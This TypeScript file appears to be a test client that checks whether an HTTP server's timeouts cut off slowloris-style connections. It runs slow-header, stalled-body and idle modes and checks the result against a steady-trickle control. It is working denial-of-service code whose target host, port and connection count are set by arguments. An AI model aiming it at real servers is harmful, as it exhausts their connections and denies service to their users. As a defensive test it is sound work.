// A4 attack client. Opens N raw TCP connections and trickles bytes so each
// one is well-formed but never completes. Modes cover the three slowloris
// variants plus a steadily-trickling control that must NOT be killed.

import net from 'node:net';

type Mode = 'headers' | 'body' | 'idle' | 'trickle';

function arg(name: string, fallback: string): string {
  const index = process.argv.indexOf(`--${name}`);
  if (index === -1) return fallback;
  const value = process.argv[index + 1];
  if (value === undefined || value.startsWith('--')) return fallback;
  return value;
}

function positiveInt(name: string, fallback: number): number {
  const raw = arg(name, String(fallback));
  const value = Number(raw);
  if (!Number.isInteger(value) || value <= 0) {
    throw new Error(`--${name} must be a positive integer, got ${JSON.stringify(raw)}`);
  }
  return value;
}

const mode = arg('mode', 'headers') as Mode;
const modes: Mode[] = ['headers', 'body', 'idle', 'trickle'];
if (!modes.includes(mode)) {
  throw new Error(`--mode must be one of ${modes.join(', ')}, got ${JSON.stringify(mode)}`);
}

const host = arg('host', '127.0.0.1');
const port = positiveInt('port', 8080);
const connections = positiveInt('connections', 5);
const intervalMs = positiveInt('interval', 1000);
const durationMs = positiveInt('duration', 8000);

let opened = 0;
let closed = 0;
let bytes = 0;
const sockets = new Set<net.Socket>();

function write(socket: net.Socket, data: string): void {
  if (socket.destroyed) return;
  bytes += Buffer.byteLength(data);
  socket.write(data);
}

function start(socket: net.Socket): () => void {
  if (mode === 'headers') {
    // Valid request line, headers forever incomplete.
    write(socket, 'GET /health HTTP/1.1\r\nHost: attack\r\n');
    const timer = setInterval(() => write(socket, `X-Pad: ${Math.random().toString(36).slice(2)}\r\n`), intervalMs);
    return () => clearInterval(timer);
  }

  if (mode === 'body') {
    // Expect: 100-continue keeps the upstream waiting for a body that never
    // arrives. The request has been parsed but no body byte is sent, so this
    // exercises the body timer rather than the idle-after-response timer.
    write(
      socket,
      'POST /api/small HTTP/1.1\r\nHost: attack\r\nExpect: 100-continue\r\n' +
      'Content-Length: 1000000\r\n\r\n',
    );
    return () => undefined;
  }

  if (mode === 'idle') {
    // Complete request, then silence on a keep-alive connection.
    write(socket, 'GET /health HTTP/1.1\r\nHost: attack\r\n\r\n');
    return () => undefined;
  }

  // Slow headers (attack) or a steady trickle (control): pad the header block
  // forever. The interval decides which side of the threshold this lands on.
  write(socket, 'GET /health HTTP/1.1\r\nHost: attack\r\n');
  const timer = setInterval(() => write(socket, `X-Pad: ${Math.random().toString(36).slice(2)}\r\n`), intervalMs);
  return () => clearInterval(timer);
}

for (let i = 0; i < connections; i += 1) {
  const socket = net.connect(port, host);
  sockets.add(socket);
  opened += 1;

  let stop: () => void = () => undefined;
  socket.on('connect', () => {
    stop = start(socket);
  });
  socket.on('close', () => {
    closed += 1;
    stop();
    sockets.delete(socket);
  });
  // Drain responses: without a data listener the socket stays paused, so a
  // server-side FIN behind unread bytes never produces the client 'close'
  // event this tool uses as its detection signal.
  socket.on('data', () => undefined);
  socket.on('error', () => undefined);
}

setTimeout(() => {
  for (const socket of sockets) socket.destroy();
  const detected = closed > 0;
  const expected = mode !== 'trickle';
  const summary = {
    mode,
    host,
    port,
    connections: opened,
    closed,
    bytes,
    durationMs,
    detected,
    expected,
  };
  console.log(JSON.stringify(summary));
  process.exit(detected === expected ? 0 : 1);
}, durationMs);
